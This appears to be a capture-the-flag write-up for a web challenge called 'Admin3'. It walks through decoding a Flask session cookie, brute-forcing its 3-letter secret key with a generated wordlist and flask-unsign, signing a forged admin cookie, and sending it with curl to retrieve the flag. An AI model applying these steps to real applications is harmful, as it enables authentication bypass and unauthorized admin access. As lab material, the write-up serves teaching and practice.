# Admin3

### Problem

We are given a portion of a website source code which checks for admin status using a Flask cookie. We must find a way to get our flag by pretending to be an admin. 

Right away, I noticed this problem is extremely similar to [Most Cookies](https://github.com/wlmci23/pico21/tree/main/Web%20Exploitation/Most%20Cookies).

### Solution

I received a cookie as follows: 
```
eyJ1c2VyIjoiZ3Vlc3QifQ.YgWYcA.hS04DIsHCB8DkUpFvowDYc2gApM
```

According to flask, the first part is a base64 encoded string of json data, second one is the timestamp, and the third is the hash.

Decoding the JSON gives us: 
```
{"user": "guest"}
```

We must change this to admin to receive the flag.

However directly tampering with the cookie won't work, as the hash would be incorrect. We can brute force each possible secret key. 

I used the tool `flask-unsign` to brute force the secret. However, a wordlist must be generated to use a dictionary attack, and since the secret inside the server file is a 3 letter random string, generating a wordlist is very trivial: (here is a Node.js script)
```js
let val = 'abcdefghijklmnopqrstuvwxyz';
let list = ``;
for(let i = 0; i < val.length; i++) { for(let j = 0; j < val.length; j++) { for(let k = 0; k < val.length; k++) {
list+=`${val.charAt(i)}${val.charAt(j)}${val.charAt(k)}\n`;
}}}
require('fs').writeFileSync('wordlist.txt', list);
```

Using the generated wordlist we can brute force the secret with the command: 
```
flask-unsign -u -c eyJ1c2VyIjoiZ3Vlc3QifQ.YgWYcA.hS04DIsHCB8DkUpFvowDYc2gApM -w wordlist.txt
```

Which showed us the secret key is `oom`. (note each instance of the challenge can have a different key, due to it's random generation)

According to the app.py file, we must change our user to admin to retrieve the flag. So we can craft a new cookie as follows: 
```
flask-unsign --sign --cookie "{'user':'admin'}" --secret 'oom'
```
Which gave me a cookie: 
```
eyJ1c2VyIjoiYWRtaW4ifQ.YgWdpg.MPZ_HY8Oew0NEGlIFQFb1pSoEhA
```

Use a curl request with a `Cookie` header: 
```
curl http://656709f.0x16.ink/ -H "Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.YgXTUA.KIGdlldD0DSJOOmKeMmsdhDWFKM;"
```

Our flag is then `flag{third_admin}`